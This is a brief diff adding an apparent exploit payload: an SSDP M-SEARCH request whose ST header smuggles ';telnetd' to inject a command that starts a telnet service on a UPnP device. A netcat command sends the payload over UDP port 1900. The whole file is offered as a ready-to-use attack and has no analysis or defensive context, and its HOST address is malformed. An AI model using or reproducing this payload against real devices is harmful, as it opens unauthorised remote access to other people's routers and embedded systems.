@@ -1,0 +1,12 @@
+//This gone be use payload.txt & cmd to connect it
+
+M-SEARCH * HTTP/1.1
+HOST:192.168.:1900
+ST:urn:device:1;telnetd
+MX:2
+MAN:"ssdp:discover"
+
+
+CMD:
+
+nc -u [IP] 1900 < payload.txt
